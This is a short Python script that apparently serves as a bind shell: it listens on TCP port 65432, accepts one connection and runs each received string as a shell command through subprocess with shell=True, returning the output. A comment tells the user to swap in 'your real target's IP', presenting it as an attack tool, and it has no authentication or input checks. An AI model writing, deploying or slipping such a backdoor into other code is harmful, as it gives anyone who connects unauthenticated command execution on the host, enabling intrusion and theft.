import socket
import subprocess

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

HOST = "127.0.0.1"     # replace with local_ip if you do not want to use your localhost, but your real target's IP
print(HOST)
PORT = 65432

def options(command):
    # file and directory listing
    msg = "Command output:\n"
    msg += subprocess.check_output(command, shell=True, universal_newlines=True)
    print(msg)
    return msg

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            msg = data.decode()
            output = options(msg)
            if(msg == "exit"):
                break  
            conn.sendall(str.encode(output))

